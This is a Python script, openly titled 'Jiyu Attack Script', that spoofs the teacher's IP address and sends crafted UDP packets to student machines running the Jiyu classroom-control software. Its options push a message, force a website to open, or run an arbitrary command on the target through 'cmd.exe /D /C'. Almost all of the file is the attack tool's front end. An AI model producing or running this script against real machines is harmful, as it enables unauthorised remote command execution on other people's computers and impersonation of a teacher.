# pylint: disable=all

"""
Jiyu Attack Script

This script implements a Jiyu attack by sending specially crafted UDP packets to a target IP address.
It allows the user to input a message, which is then formatted and packaged into a byte array before being sent.

The script uses Scapy for packet manipulation and sending.
"""

import argparse

from sender import broadcast_packet
from packet import pkg_message, pkg_website, pkg_execute


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Jiyu Attack Script",
        epilog="Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/",
    )
    parser.add_argument("-s", "--teacher-ip", type=str, required=True, help="Teacher's IP address")
    parser.add_argument("-t", "--target", type=str, required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=4705, help="Port to send packets to (default: 4705)")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-m", "--message", type=str, help="Message to send")
    group.add_argument("-w", "--website", type=str, help="Website URL to ask to open")
    group.add_argument("-c", "--command", type=str, help="Command to execute on the target")

    args = parser.parse_args()
    teacher_ip = args.teacher_ip
    target = args.target
    port = args.port
    if args.message:
        payload = pkg_message(args.message)
    elif args.website:
        payload = pkg_website(args.website)
    elif args.command:
        payload = pkg_execute("cmd.exe", f'/D /C "{args.command}"', "minimize")
    else:
        raise ValueError("Either message or website must be provided")

    broadcast_packet(teacher_ip, target, port, payload)
    print(f"Packet sent to {target} on port {port} with payload length {len(payload)} bytes")
